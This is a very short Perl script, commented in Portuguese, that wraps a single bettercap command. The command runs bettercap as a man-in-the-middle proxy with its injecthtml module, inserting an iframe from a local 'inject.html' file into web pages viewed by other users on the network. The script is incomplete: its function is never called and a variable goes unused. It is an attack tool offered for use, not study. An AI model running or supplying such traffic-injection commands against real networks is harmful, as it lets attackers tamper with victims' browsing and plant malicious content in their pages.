#precisa do bettercap 
use warnings; 
$code = "a"; 
sub inject{
    print "Service running...\n";
    my $comando = "sudo bettercap --proxy-module injecthtml --html-iframe \"inject.html\""; #comando do bettercap ;D
    exec($comando);
}
